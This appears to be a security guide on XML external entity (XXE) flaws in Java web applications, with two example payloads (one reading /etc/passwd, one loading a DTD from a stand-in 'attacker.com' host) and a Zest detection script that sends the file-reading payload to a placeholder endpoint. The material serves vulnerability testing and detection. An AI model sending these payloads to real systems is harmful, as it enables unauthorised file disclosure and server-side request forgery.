# Improper Restriction of XML External Entity Reference (CWE-611) in Java

#### Explanation of Improper Restriction of XML External Entity Reference

### Overview
Improper Restriction of XML External Entity (XXE) vulnerabilities occur when XML input containing a reference to an external entity is processed without sufficient restriction. These vulnerabilities can lead to the disclosure of confidential information, denial of service, SSRF (Server-Side Request Forgery), and potentially other malicious actions.

#### Manifestation in Java Web Applications
Java web applications, especially those using popular frameworks like Spring, Struts, or using libraries for XML processing such as JAXB, can be susceptible to XXE vulnerabilities if they're not properly configured to disable external entity processing.

### Common Injection Points
XXE vulnerabilities can be exploited by injecting malicious XML payloads through:
- URL parameters
- HTTP request bodies (POST data)
- HTTP headers
- Cookies
- Query strings

### Example Payloads
Here are some example XXE payloads that might be used to test for vulnerabilities:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
This payload tries to access the `/etc/passwd` file on a Unix system.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://www.attacker.com/malicious.dtd" >]>
<foo>&xxe;</foo>
```
This payload attempts to fetch an external DTD file from an attacker's server.

### Indicators of Success
Successful exploitation can be identified by:
- Error messages indicating parsing issues.
- The inclusion of sensitive data (e.g., contents of `/etc/passwd`) in the response.
- HTTP status codes other than 200 (e.g., 500 Internal Server Error).
- Time delays suggesting external resources are being fetched.

### Zest Scripting for XXE Detection

#### Key Components
- **ZestRequest:** Used to generate and send requests to the target web application.
- **ZestAssertion:** Used to define expected outcomes in responses.
- **ZestAction:** Used to take actions based on certain conditions.
- **ZestExpression:** Used for logic and control flow within the script.

#### Example Zest Script Structure
Here is an example structure for a Zest script to detect XXE vulnerabilities through various inputs:

```json
{
  "about": "Detecting XXE vulnerabilities",
  "zestVersion": "0.8",
  "title": "XXE Detection Script",
  "description": "This script detects XXE vulnerabilities in a target application",
  "prefix": "http://targetapplication.com/",
  "statements": [
    {
      "url": "http://targetapplication.com/api/vulnerableEndpoint",
      "method": "POST",
      "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
      "headers": "Content-Type: application/xml",
      "assertions": [
        {
          "rootExpression": {
            "code": 200,
            "not": false,
            "elementType": "ZestExpressionStatusCode"
          },
          "elementType": "ZestAssertion"
        },
        {
          "rootExpression": {
            "regex": "root:x",
            "location": "BODY",
            "not": false,
            "elementType": "ZestExpressionRegex"
          },
          "elementType": "ZestAssertion"
        }
      ],
      "index": 1,
      "elementType": "ZestRequest"
    }
  ],
  "elementType": "ZestScript"
}
```

The script includes a POST request to a potentially vulnerable endpoint with an XXE payload. It asserts that the response status is 200 and checks for the presence of the "root:x" string in the response body, indicating the contents of `/etc/passwd`.

### Variations
To cover various injection points, scripts can be adjusted to include payloads in URL parameters, headers, query strings, and cookies. Additionally, various payloads targeting different systems (e.g., Windows, remote servers) should be included.

## Review and Documentation

To fine-tune the scripts and ensure low false positives/negatives:
- Evaluate the target application to identify endpoints that process XML.
- Analyze responses carefully for indicators of successful exploitation.
- Customize payloads based on the application's underlying environment and technologies.
